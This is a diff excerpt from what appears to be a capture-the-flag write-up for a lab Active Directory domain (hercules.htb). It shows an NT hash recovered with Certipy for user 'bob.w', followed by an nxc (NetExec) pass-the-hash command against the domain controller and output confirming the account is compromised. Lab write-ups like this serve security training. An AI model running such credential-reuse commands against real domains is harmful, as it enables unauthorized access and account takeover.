@@ -812,4 +812,13 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
 ```
 
-I now have an NT hash for th
+I now have an NT hash for this user
+
+```python
+nxc smb dc.hercules.htb -u bob.w -H '8a65c74e8f0073babbfac6725c66cc3f' -k
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\bob.w:8a65c74e8f0073babbfac6725c66cc3f
+```
+
+This user is now compromised!
+
